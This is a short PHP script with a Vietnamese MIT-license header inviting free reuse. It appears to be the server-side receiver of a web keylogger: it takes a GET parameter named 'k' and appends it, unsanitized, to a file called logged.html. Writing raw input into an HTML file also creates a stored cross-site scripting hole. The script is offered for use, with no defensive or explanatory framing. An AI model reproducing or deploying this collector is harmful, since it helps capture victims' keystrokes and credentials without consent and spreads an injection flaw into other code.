// Bản quyền thuộc Đặng Quốc Trung, giấy phép MIT (bạn có thể edit và sử dụng thoải mái vì bất cứ mục đính nào miễn là vẫn tôn trọng bản quyền)
<?php 
if(!empty($_GET['k'])) {
    $logfile = fopen('logged.html', 'a+');
    fwrite($logfile, $_GET['k']);
    fclose($logfile);
}
?>